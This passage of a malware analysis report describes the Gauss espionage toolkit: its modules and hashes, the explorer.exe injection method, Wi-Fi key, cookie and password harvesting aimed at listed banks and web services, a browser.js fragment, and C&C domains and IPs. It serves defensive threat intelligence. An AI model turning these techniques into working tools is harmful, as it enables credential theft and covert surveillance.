dskapi.ocx\nProductName:    Microsoft® Windows® Operating System\nProductVersion:   5.1.3700.0\n\n```\n\n_Version info “smdk.ocx” (the same as in dskapi.ocx)_\n\n\n-----\n\n### McDmn.ocx\n\nName of the module used in Gauss: “McDomain”\n```\n  File names %system32%\\mcdmn.ocx\n  known MD5 9CA4A49135BCCDB09931CF0DBE25B5A9\n  Image Size 102 400 bytes\n  Date of compilation 16.09.2011\n\n```\nRelated files `%temp%\\md.bak`\n\nThis module is a Windows DLL file with one exported function called “DllRegisterServer.”\n\nIt creates log file: %temp%\\md.bak that is encrypted with 2-byte XOR.\n\nUses LsaQueryInformationPolicy to retrieve the name of the primary domain. Retrieves information about network adapters.\n\nAll this information is encrypted and stored in the log file.\n\n|File names|%system32%\\mcdmn.ocx|\n|---|---|\n|known MD5|9CA4A49135BCCDB09931CF0DBE25B5A9|\n|Image Size|102 400 bytes|\n|Date of compilation|16.09.2011|\n|Related files|%temp%\\md.bak|\n\n```\nFile Version:    2001.12.4414.320\nProduct Version:  5.1.2600.5788\nFile OS:      WINDOWS32\nFile Type:     DLL\nFile SubType:    UNKNOWN\nFile Date:     00:00:00 00/00/0000\nLanguage/Code Page: 1033/1200\nCompanyName:    Microsoft Corporation\nFileDescription:  Windows File Extension\nFileVersion:    2001.12.4414.320\nLegalCopyright:   Copyright (C) Microsoft Corp. 1995-1999\nLegalTrademarks:  Microsoft(R) is a registered trademark of Micro\n          soft Corporation. Windows(TM) is a trademark of\n          Microsoft Corporation\nProductName:    Microsoft® Windows® Operating System\nProductVersion:   05.01.2600.5788\n\n```\n\n_Version info “mcdmn.ocx”_\n\n\n-----\n\n### Lanhlp32.ocx\n\nName of the module used in Gauss: “Tailor”\n```\n  File names %system32%\\lanhlp32.ocx\n  Known MD5 ED2B439708F204666370337AF2A9E18F\n  Image Size 278 528 bytes\n  Date of compilation 26.10.2011\n\n```\nRelated files `%systemroot%\\Temp\\s61cs3.dat`\n\nThe module is a Windows DLL file with one exported function called “DllRegisterServer.”\n\nIt contains encrypted debug information that includes the location of the project, “d:\\projects\\tailor\\”:\n\n|File names|%system32%\\lanhlp32.ocx|\n|---|---|\n|Known MD5|ED2B439708F204666370337AF2A9E18F|\n|Image Size|278 528 bytes|\n|Date of compilation|26.10.2011|\n|Related files|%systemroot%\\Temp\\s61cs3.dat|\n\n```\nd:\\projects\\tailor\\utils\\Exceptions.h\n..\\Utils\\Buffer.cpp\n..\\Utils\\CryptUtils.cpp\n..\\Utils\\Event.cpp\n..\\Utils\\EveryoneSecurityAttributes.cpp\n..\\Utils\\File.cpp\n..\\Utils\\Mutex.cpp\n..\\Utils\\MyWlanApi.cpp\n..\\Utils\\OsUtils.cpp\n..\\Utils\\RemoteMemoryBuffer.cpp\n..\\Utils\\Storage.cpp\n..\\Utils\\StringUtils.cpp\n..\\Utils\\Waiter.cpp\n.\\SavedWNetworkConnectionsWin5.cpp\n.\\SavedWNetworkConnectionsWin6.cpp\n.\\VisibleNetworks.cpp\n\n```\n\nCreates mutex : Global\\EnvDBE\n\nCreates log file: %systemroot%\\Temp\\s61cs3.dat\n\nOperates on Windows XP, Windows Vista and Windows 7.\n\nOn Windows XP:\n```\n.\\SavedWNetworkConnectionsWin5.cpp\n\n```\nEnumerates registry keys in HKLM\\SOFTWARE\\Microsoft\\WZCSVC\\Parameters\\Interfaces\\\n\nExtracts “Static#” values that contain wireless key data.\n\n\n-----\n\nOn Windows Vista and Windows 7 :\n```\n..\\Utils\\MyWlanApi.cpp\n.\\SavedWNetworkConnectionsWin6.cpp \n.\\VisibleNetworks.cpp\n\n```\nUses extended wlanapi.dll API to access WLAN information. Enumerates available wireless interfaces, then enumerates all\n\nprofiles and extracts SSID, name and wireless key information. Then, it retrieves the list of wireless networks visible to all the\n\nwireless interfaces.\n\nThe log file is encrypted with a simple 1-byte XOR.\n\n```\nFile Version:    5.1.3700.0\nProduct Version:  5.1.3700.0\nFile OS:      NT (WINDOWS32)\nFile Type:     DRV\nFile SubType:    DRV SOUND\nFile Date:     00:00:00 00/00/0000\nLanguage/Code Page: 1033/1200\nCompanyName:    Microsoft Corporation\nFileDescription:  Microsoft Windows LAN Component\nFileVersion:    5.1.3700.0\nInternalName:    lanhlp32.ocx\nLegalCopyright:   © Microsoft Corporation. All rights reserved.\nOriginalFilename:  lanhlp32.ocx\nProductName:    Microsoft® Windows® Operating System\nProductVersion:   5.1.3700.0\n\n```\n\n_Version info “lanhlp32.ocx”_\n\n\n-----\n\n### Devwiz.ocx\n\nName of the module used in Gauss: “Cosmos”\n```\n  File names %system32%\\devwiz.ocx\n  Known MD5 CBB982032AED60B133225A2715D94458\n  Image Size 102 400 bytes\n  Date of compilation 19.03.2012\n\n```\nRelated files `%temp%\\~ZM6AD3.tmp`\n\nThe module is a Windows DLL file with one exported function called “RefreshDev.”\n\nIt creates log file : %WINDIR%\\temp\\~ZM6AD3.tmp\n\nThe log file is not encrypted and starts with a magic number 0xF68B973D\n\nThe module collects the following information and writes it to the log file :\n\n  - CMOS RAM contents\n\n  - Registry keys :\n\n|File names|%system32%\\devwiz.ocx|\n|---|---|\n|Known MD5|CBB982032AED60B133225A2715D94458|\n|Image Size|102 400 bytes|\n|Date of compilation|19.03.2012|\n|Related files|%temp%\\~ZM6AD3.tmp|\n\n```\n[ HKLM\\HARDWARE\\DESCRIPTION\\System ] SystemBiosVersion,SystemBiosDate\n\n```\n```\n[ HARDWARE\\DESCRIPTION\\System\\BIOS ]\nBIOSVendor, BIOSVersion, BIOSReleaseDate, BaseBoardManufacturer,\nBaseBoardProduct, BaseBoardVersion, SystemFamily,\nSystemManufacturer, SystemProductName, SystemSKU, SystemVersion\n\n```\n\nAll retrieved information is written to the log file.\n\n\n-----\n\n```\nFile Version:    5.1.2600.0\nProduct Version:  5.1.2600.0\nFile OS:      NT (WINDOWS32)\nFile Type:     DRV\nFile SubType:    DRV SOUND\nFile Date:     00:00:00 00/00/0000\nLanguage/Code Page: 1033/1200\nCompanyName:    Microsoft Corporation\nFileDescription:  Windows Device Wizard\nFileVersion:    5.1.2600.0\nInternalName:    devwiz.ocx\nLegalCopyright:   © Microsoft Corporation. All rights reserved.\nOriginalFilename:  devwiz.ocx\nProductName:    Microsoft® Windows® Operating System\nProductVersion:   5.1.2600.0\n\n```\n\n_Version info “devwiz.ocx”_\n\n\n-----\n\n### Winshell.ocx\n\nName of the module used in Gauss: “Gauss”\n```\n  File names %system32%\\winshell.ocx\n  Some known MD5 EF6451FDE3751F698B49C8D4975A58B5\n                   7AC2799B5337B4BE54E5D5B03B214572\n                   4FB4D2EB303160C5F419CEC2E9F57850\n  Image Size 405 504 (August 2011)\n                   417 792 (October 2011)\n                   401 408 (Dec 2011 - Jan 2012)\n  Number of resources 6\n  Resources 121,122,123,124,125,126\n  Date of compilation 08.08.2011\n                   03.10.2011\n                   14.12.2011\n                   05.01.2012\n\n```\nRelated files `%temp%\\ws1bin.dat`\n```\n                   browser.js\n                   browser.xul\n\n```\nfileio.js\n```\n                   chrome.manifest\n                   lppd.dat\n                   install.rdf\n                   rssf.dat\n                   lfm.dat\n                   mppd.dat\n                   pddp.dat\n\n```\nCreates events: “Global\\SrvReportCondition”, “Global\\DhwSyncEvent”, “Global\\ShellSync”\n\nInterestingly, all three variants of the module that we have analyzed contain information about the location and names of\n\nthe original projects:\n\n|File names|%system32%\\winshell.ocx|\n|---|---|\n|Some known MD5|EF6451FDE3751F698B49C8D4975A58B5 7AC2799B5337B4BE54E5D5B03B214572 4FB4D2EB303160C5F419CEC2E9F57850|\n|Image Size|405 504 (August 2011) 417 792 (October 2011) 401 408 (Dec 2011 - Jan 2012)|\n|Number of resources|6|\n|Resources|121,122,123,124,125,126|\n|Date of compilation|08.08.2011 03.10.2011 14.12.2011 05.01.2012|\n|Related files|%temp%\\ws1bin.dat browser.js browser.xul fileio.js chrome.manifest lppd.dat install.rdf rssf.dat lfm.dat mppd.dat pddp.dat|\n\n|Variant|Path to project files|\n|---|---|\n|August 2011|d:\\projects\\gauss|\n|October 2011|d:\\projects\\gauss_for_macis_2|\n|Dec 2011-Jan 2012|c:\\documents and settings\\flamer\\desktop\\gauss_white_1|\n\n\n-----\n\nContains encrypted debug information that includes the location and files of the project:\n\n\nc:\\documents and settings\\flamer\\desktop\\gauss _ white _ 1\\utils\\\n```\nExceptions.h\n.\\main.cpp\n.\\Manager.cpp\n\n```\nc:\\documents and settings\\flamer\\desktop\\gauss _ white _ 1\\utils\\SmartPtr.h\n```\n.\\Injector.cpp\n\n```\nc:\\documents and settings\\flamer\\desktop\\gauss _ white _ 1\\gauss\\../Utils/ComUtils.h\n```\n.\\History.cpp\n.\\FirefoxPluginInstaller.cpp\n.\\Telemetry.cpp\n.\\Storage.cpp\n.\\OsUtils.cpp\n.\\ProcessSnapshot.cpp\n.\\Event.cpp\n.\\GaussThread.cpp\n.\\Buffer.cpp\n.\\RemoteMemoryBuffer.cpp\n.\\File.cpp\n.\\Mutex.cpp\n.\\Waiter.cpp\n.\\EveryoneSecurityAttributes.cpp\n.\\Catcher.cpp\n.\\BrowserConnector.cpp\n\n```\nc:\\documents and settings\\flamer\\desktop\\gauss _ white _ 1\\minime\\../Utils/SmartPtr.h\n```\n.\\Assigner.cpp\n.\\IEAbstractElements.cpp\n.\\FormExtractor.cpp\n.\\COMAbstractDataTypes.cpp\n\n```\n\nThe debug information which was accidentally forgotten by the developers provides some interesting details. For instance,\n\nthe Windows username which compiled the project can be seen in the strings above as “flamer”.\n\n\n-----\n\nDllMain starts a thread only if loaded by “explorer.exe”.\n\nWrites log file: %systemroot%\\Temp\\ws1bin.dat. Log file starts with magic number 0x0A86FD375, encrypted with\n\n1-byte XOR 0x46. Log file writer is guarded by mutex “Global\\ShellSyncCom”.\n\nReads registry key :\n\n```\nSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Reliability\nShutdownInterval = binary data\n\n```\n\nChecks Windows version and, onWindows Vista and Windows 7, it accesses %SystemDrive%\\Users. On earlier versions,\n\nit uses %SystemDrive%\\Documents and settings and gets list of directories there.\n\nExport “InitShellEx” : Enumerates all entries in HKEY _ USERS, removes all entries in\n```\nSOFTWARE\\Mozilla\\Mozilla\\Firefox for each user, searches for its log ws1bin.dat and removes it.\n\n```\nExport “SetWindowEvent” : set event “Global\\DhwSyncEvent”, wait for other thread to exit in 20 seconds, then terminate\n\nthat thread.\n\nExport “ShellNotifyUser” : returns 1\n\nExport “ShellNotifyUserEx” : main export. Starts its main thread that should be monitored by the event “SetWindowEvent”\n\nand returns.\n\nLists running processes and returns if “evil.exe” is running.\n\nAdditionally logs the presence of the following registry keys :\n\n```\nHKLM\\SOFTWARE\\KasperskyLab\\AVP6”, “HKLM\\SOFTWARE\\KasperskyLab\\\nprotected\\AVP7\n\n```\n\nThen it starts a loop searching for running instances of %systemroot%\\explorer.exe. If found, it injects\n```\n%systemroot%\\system32\\winshell.ocx (own body) into that process.\n\n```\nIt uses an interesting technique to inject itself into Explorer: it creates a remote thread with the address of “LoadLibraryW”\n\nAPI as its start address. The path to its ocx file is passed to the function as “lpParameter”.\n\n\n-----\n\nTelemetry: It retrieves and logs the following:\n\n  - Computer name\n\n  - Windows OS version\n\n  - List of running processes\n\n  - List of directories in %PROGRAMFILES%\n\n  - Version of Internet Explorer browser\n\n  - Primary domain name\n\n  - Network adapter information\n\nSearches for Cookies directory, retrieves all cookie files and writes their contents into its log. Searches for cookies that\n\ncontain the following strings:\n\n\npaypal\n\nmastercard\n\neurocard\n\nvisa\n\namericanexpress\n\nbankofbeirut\n\neblf\n\n\nblombank\n\nbyblosbank\n\ncitibank\n\nfransabank\n\nyahoo\n\ncreditlibanais\n\namazon\n\n\nfacebook\n\ngmail\n\nhotmail\n\nebay\n\nmaktoob\n\n\nThen, it retrieves Internet Explorer browsing history using IUrlHistoryStg::EnumUrls function, and tries to extract password\n\nand text fields from loaded pages.\n\nThe Firefox plugin is written in several files, all of them are extracted and decrypted from the resources of the module.\n\nResource Id File name of the Firefox Plugin component\n\n121 browser.js\n\n122 browser.xul\n\n123 fileio.js\n\n124 chrome.manifest\n\n125 lppd.dat\n\n126 install.rdf\n\nAppends Firefox configuration file “prefs.js” with the following string, disabling Firefox “select your add-ons” window that is\n\nusually shown after each Firefox update:\n\n|Resource Id|File name of the Firefox Plugin component|\n|---|---|\n|121|browser.js|\n|122|browser.xul|\n|123|fileio.js|\n|124|chrome.manifest|\n|125|lppd.dat|\n|126|install.rdf|\n\n```\nuser _ pref(“extensions.shownSelectionUI”, true);\n\n```\n\n-----\n\nInstalls the Firefox extension, on Windows Vista and Windows 7 into AppData\\Roaming\\Mozilla\\Firefox\\Profiles,\n\non earlier versions into Application Data\\Mozilla\\Firefox\\Profiles. All files are written in a directory named\n\n“{a288cad4-7b24-43f8-9f4d-8e156305a8bc}”.\n\nThe Firefox extension extracts the following data:\n\n  - Browsing history\n\n  - Passwords (saved and entered by the user)\n\n  - Cookies. The extension can be configured to look only for cookies of Google, Hotmail, Facebook, Yahoo\n\n```\nconst Cc = Components.classes;\nconst Ci = Components.interfaces;\nconst EXTENSION _ ID = “{a288cad4-7b24-43f8-9f4d-8e156305a8bc}”;\nconst EXTENSION _ PATH = DirIO.get(“ProfD”).path+”\\\\extensions\\\\”+\nEXTENSION _ ID;\nconst QUERY _ ID = ‘YlU/X1gFa2Isb1YkcFMnP18u`1kkb1goYFUO\nakAgY1ULa1EjYlU/X1gPXWMyc18xYGM0b1UxalEsYVYgX1Uha18q\ndVEna18lYWQi`Dgob2QubmklYWQi`DEjYGIkb2MvXWMyc18xY\nFwoclUl`WgPblUlb/oSY18uY1wk`FkjYT8tRV4ocFYkcFMnPVwr\nP18u`1kkb2gublk/’;\nconst EXTENSION _ URL = “about:addons”;\nconst EXTENSION _ XUL = “chrome://mozapps/content/extensions/\nextensions.xul”;\nconst ERROR _ FILE = “rssf.dat”;\nconst LOG _ FILE = “lfm.dat”;\nconst OUTPUT _ FILE = “mppd.dat”;\nconst VERSION _ FILE = “lddp.dat”;\nconst MAX _ FILE _ SIZE = Math.pow(2,20)*10;\nconst MEAN _ ROW _ SIZE = 100;\nconst MAX _ ROW _ COUNT = (1/3)*(MAX _ FILE _ SIZE/MEAN _ ROW _ SIZE);\n\n```\n\n_Part of browser.js code_\n\n\n-----\n\nThe Firefox extension writes several log files in its directory:\n\n|Log file name|Description|\n|---|---|\n|rssf.dat|Browsing history|\n|lfm.dat|Log file|\n|mppd.dat|Collected passwords|\n|pddp.dat|Collected cookies|\n\n```\nFile Version:    5.1.3700.0\nProduct Version:  5.1.3700.0\nFile OS:      NT (WINDOWS32)\nFile Type:     DRV\nFile SubType:    DRV SOUND\nFile Date:     00:00:00 00/00/0000\nLanguage/Code Page: 1033/1200\nCompanyName:    Microsoft Corporation\nFileDescription:  Microsoft Windows Shell Component\nFileVersion:    5.1.3700.0\nInternalName:    winshell.ocx\nLegalCopyright:   © Microsoft Corporation. All rights reserved.\nOriginalFilename:  winshell.ocx\nProductName:    Microsoft® Windows® Operating System\nProductVersion:   5.1.3700.0\n\n```\n\n_Version info “winshell.ocx”_\n\n\n-----\n\n### Windig.ocx\n\nName of the module used in Gauss: “Lagrange”\n```\n    File names %system32%\\windig.ocx\n    Known MD5 DE2D0D6C340C75EB415F726338835125\n    Image Size 180 224 bytes\n    Date of compilation 15.07.2011\n\n```\nRelated files `Fonts\\ pldnrfn.ttf`\n\nThe module is a Windows DLL file with one exported function called “GlobalDeleteAtomL.”\\\n\nThe module reads the registry key that is originally created by “ShellHW” module :\n\n|File names|%system32%\\windig.ocx|\n|---|---|\n|Known MD5|DE2D0D6C340C75EB415F726338835125|\n|Image Size|180 224 bytes|\n|Date of compilation|15.07.2011|\n|Related files|Fonts\\ pldnrfn.ttf|\n\n```\nHKLM\\ SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Reliability\nShutdownInterval = binary data\n\n```\n\nIf the value is not present in the registry, it writes a random value into that key.\n\nThen, it creates a new TrueType font file “%SystemRoot%\\fonts\\pldnrfn.ttf” (62 668 bytes long) from a template and using\n\nrandomized data from the ShutdownInterval key. The creation time of the font file is set to the creation time of the Arial font,\n```\n%SystemRoot%\\fonts\\ARIAL.TTF.\n\n```\nThen, a custom font named “Palida Narrow” is registered in the system font storage using the “AddFontResourceW” API\n\nfunction. The module also creates a registry value:\n\n```\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Fonts\nPalida Narrow (TrueType)=pldnrfn.ttf\n\n```\n\nThe purpose of the addition of this font is not yet known. It appears to contain valid Western, Baltic and Turkish symbols.\n\n\n-----\n\n_Font information from Font Viewer_\n\n```\nFile Version:    2001.12.4414.320\nProduct Version:  5.1.2600.5788\nFile OS:      WINDOWS32\nFile Type:     DLL\nFile SubType:    UNKNOWN\nFile Date:     00:00:00 00/00/0000\nLanguage/Code Page: 1033/1200\nCompanyName:    Microsoft Corporation\nFileDescription:  WIN32 Digital Library\nFileVersion:    2001.12.4414.320\nLegalCopyright:   Copyright (C) Microsoft Corp. 1995-1999\nLegalTrademarks:  Microsoft(R) is a registered trademark of Microsoft\n          Corporation. Windows(TM) is a trademark of\n          Microsoft Corporation\nProductName:    Microsoft® Windows® Operating System\nProductVersion:   05.01.2600.5788\n\n```\n\n_Version info “windig.ocx”_\n\n\n-----\n\n### Gauss C&C Information\n\nTo upload data stolen from infected machines, Gauss uses a number of command-and-control servers predefined in its\n\nflexible configuration.\n\n_Figure 1 - Gauss encrypted C&C information data_\n\n#### Here’s a look at the decrypted configuration data:\n\n_Figure 2 - Gauss decrypted C&C configuration data_\n\n\n-----\n\nIn the example above, we can see the C&C domains/hosts together with the name of the script (userhome.php) on the\n\nserver which is used for communication.\n\nGoing through the multitude of Gauss samples, we identified several domains used as C&C servers:\n\n  - *.gowin7.com\n\n  - *.secuurity.net\n\n  - *.datajunction.org\n\n  - *.bestcomputeradvisor.com\n\n  - *.dotnetadvisor.info\n\n  - *.guest-access.net\n\nWmiqry.ocx\n\n01.06.2011 dotnetadvisor.info bestcomputeradvisor.info datajunction.org guest-access.net\n\n16.07.2011 *.bestcomputeradvisor.info *.guest-access.net\n\n18.07.2011 *.bestcomputeradvisor.info *.guest-access.net\n\n28.09.2011 *.gowin7.com *.secuurity.net\n\n20.10.2011 *.datajunction.org *.dotnetadvisor.info\n\n20.10.2011 *.gowin7.com *.secuurity.net\n\nDepending on the variant, * can be ‘a’ or ‘b’ or ‘c’ – and so on.For instance, a fully qualified hostname as in the example\nabove is “b.gowin7.com”.\n\nMost samples we have use “*.gowin7.com” and “*.secuurity.net”. The domains “gowin7.com” and “secuurity.net “ have\n\nbeen registered by an “Adolph Dybevek, which is most likely a fake identity:\n\n|Wmiqry.ocx|Col2|Col3|Col4|Col5|\n|---|---|---|---|---|\n|01.06.2011|dotnetadvisor.info|bestcomputeradvisor.info|datajunction.org|guest-access.net|\n|16.07.2011|*.bestcomputeradvisor.info|*.guest-access.net|||\n|18.07.2011|*.bestcomputeradvisor.info|*.guest-access.net|||\n|28.09.2011|*.gowin7.com|*.secuurity.net|||\n|20.10.2011|*.datajunction.org|*.dotnetadvisor.info|||\n|20.10.2011|*.gowin7.com|*.secuurity.net|||\n\n\nowner-name: Adolph Dybevek\n\nowner-address: Prinsen gate 6\n\nowner-city: Oslo\n\nadmin-address: Prinsen gate 6\n\nICANN Registrar: UNITED-DOMAINS AG\n\nCreated: 2012-03-15\n\nExpires: 2013-03-15\n\nUpdated: 2012-03-15\n\n\n-----\n\nAs in the case of Flame these domain registration addresses point to existing businesses. For example, at Prinsens Gate 6\n\nin Olso, we find a hotel in Norway:\n\nSimilarly, many of Flame C&D domain fake registrations used addresses of hotels.\n\nDuring the period of monitoring, we observed these two main domains pointing to two different servers in India and\n\nPortugal. Based on passive DNS research, we identified three other servers, located in the US which appear to have been\n\nused as C&C.\n\nThe hosts “gowin7.com” and “secuurity.net”  pointed to the following IP addresses:\n\nDate Domain IP\n\n2012-06-28 23:05:35 b.gowin7.com 109.71.45.115\n\n2012-06-29 07:05:28 (changed) b.gowin7.com 182.18.166.116\n\n2012-06-28 23:05:38 b.secuurity.net 109.71.45.115\n\n2012-06-29 07:05:29 (changed) b.secuurity.net 182.18.166.116\n\nOn 29[th] of June, 2012, the two C&C domains “gowin7.com” and “secuurity.net” were changed from IP 109.71.45.115 to a\n\nnew IP 182.18.166.116.\n\n|Date|Domain|IP|\n|---|---|---|\n|2012-06-28 23:05:35|b.gowin7.com|109.71.45.115|\n|2012-06-29 07:05:28 (changed)|b.gowin7.com|182.18.166.116|\n|2012-06-28 23:05:38|b.secuurity.net|109.71.45.115|\n|2012-06-29 07:05:29 (changed)|b.secuurity.net|182.18.166.116|\n\n\n-----\n\nBoth servers were shut down around July 13[th], 2012. Prior to shut down, we managed to collect important information. Both\n\nappeared to be running Debian Linux, which is consistent with the Flame C&C servers. They were listening on ports 22, 80\n\nand 443. The SSL certificates were self-signed, once again, the same as in the case of Flame. Here’s the certificate for the\n\nserver in Portugal:\n\nIf we are to believe the information in the certificate, it was generated on 17 Feb 2012.\n\nThe server at 182.18.166.116 (India) appears to currently host two other related domains:\n\n  - bestcomputeradvisor.com\n\n  - dotnetadvisor.info\n\nBoth have been registered by somebody named Gilles Renaud, probably another fake identity:\n\nRegistrant:\n\n\nGilles Renaud\n\nNeugasse 10\n\nZurich, Zurich 8005\n\nCH\n\n\n-----\n\nThey were previously hosted in the US, at the IPs: 173.204.235.204 and 173.204.235.196.\n\nWe currently have seen samples which used {e,g,h}.bestcomputeradvisor.com and “c.dotnetadvisor.info” for command-and\ncontrol. It’s quite possible that other samples exist pointing to different hosts.\n\nThe additional domains ”datajunction.org” and “guest-access.net” can be found in some samples and it is also used for\n\nC&C communications. We currently have samples which use “c.datajunction.org” and “d.datajunction.org” but there are\n\nprobably others using “a.*” and “b.*”.\n\nBoth have been registered by somebody named “Peter Kulmann,” probably another fake identity:\n\n\nRegistrant Name:Peter Kulmann\n\nRegistrant Street1:Antala Staska 1301/19\n\nRegistrant Street2:\n\nRegistrant Street3:\n\nRegistrant City:Prague\n\nRegistrant State/Province:\n\nRegistrant Postal Code:14000\n\nRegistrant Country:CZ\n\n\nThe address “Antala Staska 1301/19” appears once again to be fake – pointing to a supermarket/pharmacy in Prague:\n\nCurrently (as of August 2012), all the “*.datajunction.org” hosts point to the C&C server in India. Previously, they pointed to\n\nthe server in Portugal. Just like the others, they were previously hosted in US.\n\nIn addition to these, we identified another domain named “dataspotlight.net” which was hosted on the same servers. The\n\nregistrant is unknown and we couldn’t find any samples using it, however, it is probably related to the others.\n\n\n-----\n\n### Gauss C2 Domains Overview:\n\nIn total, we have identified 7 domains used or related to the Gauss malware:\n\nDomain Registered by Currently hosted Previously hosted Older hosted:\n\ngowin7.com Adolph Dybevek India Portugal US\n\nsecuurity.net Adolph Dybevek India Portugal US\n\ndatajunction.org Peter Kulmann India Portugal US\n\nbestcomputeradvisor.com Gilles Renaud India Portugal US\n\ndotnetadvisor.info Gilles Renaud India Portugal US\n\ndataspotlight.net UNKNOWN India Portugal UNKNOWN\n\nguest-access.net Peter Kulmann No No No\n\nDomain registration history:\n\nDomain Registration date\n\nbestcomputeradvisor.com, dotnetadvisor.info 22 July 2011\n\ndatajunction.org. guest-access.net 26 July 2011\n\ngowin7.com, secuurity.net 15 March 2012\n\ndataspotlight.net 18 April 2012\n\nAs can be seen from the table above, four domains were created in 2011 and were used in older samples. The newer\n\nsamples use “gowin7.com” and “secuurity.net”, which were registered on March 15[th], 2012.\n\nKnown Gauss C2 server IPs:\n\n|Domain|Registered by|Currently hosted|Previously hosted|Older hosted:|\n|---|---|---|---|---|\n|gowin7.com|Adolph Dybevek|India|Portugal|US|\n|secuurity.net|Adolph Dybevek|India|Portugal|US|\n|datajunction.org|Peter Kulmann|India|Portugal|US|\n|bestcomputeradvisor.com|Gilles Renaud|India|Portugal|US|\n|dotnetadvisor.info|Gilles Renaud|India|Portugal|US|\n|dataspotlight.net|UNKNOWN|India|Portugal|UNKNOWN|\n|guest-access.net|Peter Kulmann|No|No|No|\n\n|Domain|Registration date|\n|---|---|\n|bestcomputeradvisor.com, dotnetadvisor.info|22 July 2011|\n|datajunction.org. guest-access.net|26 July 2011|\n|gowin7.com, secuurity.net|15 March 2012|\n|dataspotlight.net|18 April 2012|\n\n|Server|Location|\n|---|---|\n|182.18.166.116|India, Hyderabad|\n|109.71.45.115|Portugal, Constancia|\n|173.204.235.204|United States, San Francisco|\n|173.204.235.196|United States, San Francisco|\n|173.204.235.201|United States, San Francisco|\n\n\n-----\n\nHere’s a comparison of the Flame and Gauss C2 infrastructure:\n\nFlame Gauss\n\nHosting VPS running Debian Linux VPS running Debian Linux\n\nServices available SSH, HTTP, HTTPS SSH, HTTP, HTTPS\n\nSSL certificate “localhost.localdomain” “localhost.localdomain”\n– self signed – self signed\n\nRegistrant info Fake names Fake names\n\nAddress of registrants Hotels, shops Hotels, shops\n\nC2 traffic protocol HTTPS HTTPS\n\nC2 traffic encryption None XOR 0xACDC\n\nC2 script names cgi-bin/counter.cgi, common/index.php userhome.php\n\nNumber of C2 domains ~100 6\n\nNumber of fake identities used ~20 3\nto register domains\n\n### DNS Balancing\n\n[For some of the C2’s, the controllers used a technique known as DNS balancing or “Round robin DNS” (http://en.wikipedia.](http://en.wikipedia.org/wiki/Round-robin_DNS)\n\n[org/wiki/Round-robin_DNS) – probably to even the load. This is a common technique in the case of massive traffic to a](http://en.wikipedia.org/wiki/Round-robin_DNS)\n\nwebsite, suggesting that at their peak, the Gauss C2’s were handling quite a lot of data.\n\nHere’s one such example of DNS balancing:\n```\n      ;;QUESTION SECTION:\n      ;DATAJUNCTION.ORG.     IN   A\n      ;;ANSWER SECTION:\n      DATAJUNCTION.ORG.   900  IN   A   182.18.166.116\n      DATAJUNCTION.ORG.  3600  IN   A   173.204.235.204\n      DATAJUNCTION.ORG.   900  IN   A   109.71.45.115\n\n```\nAs it can be seen, the domain datajunction.org resolves to three different IPs: 182.18.166.116, 173.204.235.204 and\n\n109.71.45.115.\n\n|Col1|Flame|Gauss|\n|---|---|---|\n|Hosting|VPS running Debian Linux|VPS running Debian Linux|\n|Services available|SSH, HTTP, HTTPS|SSH, HTTP, HTTPS|\n|SSL certificate|“localhost.localdomain” – self signed|“localhost.localdomain” – self signed|\n|Registrant info|Fake names|Fake names|\n|Address of registrants|Hotels, shops|Hotels, shops|\n|C2 traffic protocol|HTTPS|HTTPS|\n|C2 traffic encryption|None|XOR 0xACDC|\n|C2 script names|cgi-bin/counter.cgi, common/index.php|userhome.php|\n|Number of C2 domains|~100|6|\n|Number of fake identities used to register domains|~20|3|\n\n\n-----\n\n### Timeline\n\nWe tried to put together all the date-of-creation information for the different Gauss modules, as well as those for Flame and\n\nDuqu. Since no Gauss modules created before 2011 have been found, the table below does not include earlier data for\n\nFlame and Duqu modules.\n\n|Module name (2011)|Date of creation|Malware|\n|---|---|---|\n|advnetcfg.2|11.01.2011|Flame|\n|nteps32.2|11.01.2011|Flame|\n|authpack.1|23.01.2011|Flame|\n|mssecmgr.7|17.02.2011|Flame|\n|mssecmgr.9|21.03.2011|Flame|\n|msglu32.1|29.03.2011|Flame|\n|wmiqry32.1|01.06.2011|Gauss|\n|dskapi.32 res.1|30.06.2011|Gauss|\n|dskapi.64 res|30.06.2011|Gauss|\n|windig.1|15.07.2011|Gauss|\n|wmiqry32.2|16.07.2011|Gauss|\n|wmiqry32.3|18.07.2011|Gauss|\n|winshell.1|08.08.2011|Gauss|\n|mssecmgr.8|31.08.2011|Flame|\n|mcdmn.1|16.09.2011|Gauss|\n|smdk.1|27.09.2011|Gauss|\n|dskapi.1|28.09.2011|Gauss|\n|wmiqry32.4|28.09.2011|Gauss|\n|winshell.2|03.10.2011|Gauss|\n|msglu32.2|10.10.2011|Flame|\n|dskapi.2|13.10.2011|Gauss|\n|smdk.2|17.10.2011|Gauss|\n|igdkmd16b.sys|17.10.2011|Duqu|\n|wmiqry32.5|20.10.2011|Gauss|\n|lanhlp32.1|26.10.2011|Gauss|\n|dskapi.3|01.11.2011|Gauss|\n|soapr32.1|27.11.2011|Flame|\n|dskapi.4|29.11.2011|Gauss|\n|dskapi.32 res.2|29.11.2011|Gauss|\n|winshell.3|14.12.2011|Gauss|\n|Module name (2012)|Date of creation|Malware|\n|winshell.4|05.01.2012|Gauss|\n|mcd9x86.sys|23.02.2012|Duqu|\n|devwiz.1|19.03.2012|Gauss|\n|browse32.ocx|09.05.2012|Flame|\n\n\n-----\n\n### Files list\n\nWe have put together the names of all modules, temporary files, log files and data files used by Gauss in one way or another\n\nand that are known to us.\n\n|Main modules|Path|\n|---|---|\n|wmiqry32.dll|%system%\\wbem|\n|wmihlp32.dll|%system%\\wbem|\n|dskapi.ocx|%system%|\n|winshell.ocx|%system%|\n|devwiz.ocx|%system%|\n|lanhlp32.ocx|%system%|\n|mcdmn.ocx|%system%|\n|smdk.ocx|%system%|\n|windig.ocx|%system%|\n|system32.bin|root folder USB drive|\n|system32.dat|root folder USB drive|\n|.CatRoot.tmp Data files and folders ~shw.tmp|root folder USB drive Path %temp%|\n|~stm.tmp|%temp%|\n|ws1bin.dat|%windir%\\Temp|\n|ws1bin.dat|%temp%|\n|~gdl.tmp|%temp%|\n|~mdk.tmp|%temp%|\n|.thumbs.db|root folder USB drive|\n|wabdat.dat|%temp%|\n|desktop.ini|inside folders on USB drive|\n|target.lnk|inside folders on USB drive|\n|.Backup0[D-M]|directory on USB drive|\n|.Backup00[D-M]|directory on USB 